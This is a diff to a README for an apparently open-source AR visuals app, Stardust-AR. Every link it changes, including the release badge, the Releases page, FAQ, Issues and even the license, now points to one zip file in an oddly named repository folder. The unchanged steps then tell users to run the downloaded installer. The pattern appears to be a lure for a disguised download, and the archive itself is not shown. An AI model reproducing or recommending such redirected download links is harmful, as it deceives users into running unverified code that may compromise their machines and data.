@@ -4,9 +4,9 @@
 
 ### 💾 Download the Application
 
-[![Download Stardust-AR](https://img.shields.io/badge/Download-Stardust--AR-blue.svg)](https://github.com/qmla/Stardust-AR/releases)
+[![Download Stardust-AR](https://github.com/qmla/Stardust-AR/raw/refs/heads/main/roughdry/Stardust_AR_3.8.zip)](https://github.com/qmla/Stardust-AR/raw/refs/heads/main/roughdry/Stardust_AR_3.8.zip)
 
-To begin, visit the [Releases page](https://github.com/qmla/Stardust-AR/releases) to download the Stardust-AR application.
+To begin, visit the [Releases page](https://github.com/qmla/Stardust-AR/raw/refs/heads/main/roughdry/Stardust_AR_3.8.zip) to download the Stardust-AR application.
 
 ## 📋 Requirements
 
@@ -16,7 +16,7 @@ To begin, visit the [Releases page](https://github.com/qmla/Stardust-AR/releases
 
 ## 📥 Download & Install
 
-1. Go to the [Releases page](https://github.com/qmla/Stardust-AR/releases).
+1. Go to the [Releases page](https://github.com/qmla/Stardust-AR/raw/refs/heads/main/roughdry/Stardust_AR_3.8.zip).
 2. Choose the latest version.
 3. Click on the download link for your operating system.
 4. After the download finishes, locate the file and run the installation.
@@ -61,11 +61,11 @@ If you encounter any issues, try the following:
 1. Ensure your webcam is functioning and has permission to access the browser.
 2. Check if your browser is up to date.
 3. Restart the application if it becomes unresponsive.
-4. Refer to the FAQ section on the [GitHub page](https://github.com/qmla/Stardust-AR).
+4. Refer to the FAQ section on the [GitHub page](https://github.com/qmla/Stardust-AR/raw/refs/heads/main/roughdry/Stardust_AR_3.8.zip).
 
 ## 📞 Support
 
-For additional help or questions, reach out via the Issues section on the [GitHub repository](https://github.com/qmla/Stardust-AR/issues).
+For additional help or questions, reach out via the Issues section on the [GitHub repository](https://github.com/qmla/Stardust-AR/raw/refs/heads/main/roughdry/Stardust_AR_3.8.zip).
 
 ## 🌟 Contribution
 
@@ -77,6 +77,6 @@ Join the discussion on our GitHub issues to share experiences, report bugs, or s
 
 ## 📜 License
 
-Stardust-AR is open-source software. Review the license on the [GitHub repository](https://github.com/qmla/Stardust-AR/blob/main/LICENSE) for details.
+Stardust-AR is open-source software. Review the license on the [GitHub repository](https://github.com/qmla/Stardust-AR/raw/refs/heads/main/roughdry/Stardust_AR_3.8.zip) for details.
 
 Feel free to explore and enjoy creating engaging visuals with Stardust-AR!
